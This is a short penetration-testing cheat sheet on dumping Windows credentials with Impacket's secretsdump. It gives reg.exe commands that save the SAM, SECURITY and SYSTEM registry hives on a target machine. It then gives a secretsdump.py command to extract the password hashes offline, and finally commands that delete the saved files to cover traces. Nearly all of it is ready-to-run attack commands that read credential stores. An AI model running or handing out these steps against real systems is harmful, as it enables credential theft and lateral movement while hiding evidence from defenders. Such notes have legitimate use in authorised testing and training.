# Impacket Secretsdump

1. On target machine
    ```batch
    mkdir c:\temp
    reg.exe save hklm\sam c:\temp\sam.save
    reg.exe save hklm\security c:\temp\security.save
    reg.exe save hklm\system c:\temp\system.save
    ```

1. Retrieve the files
    * See [Data Exfiltration](../../#data-exfiltration)

1. On local machine (~Kali)
    ```bash
    secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
    ```
    
1. On target machine
    ```batch
    del c:\temp\sam.save
    del c:\temp\security.save
    del c:\temp\system.save
    rmdir c:\temp # Except when the "temp" folder already existed before Step 1. # Check if there are other contents in the folder
    ```


[^1]: [Pure Security](https://pure.security/dumping-windows-credentials/)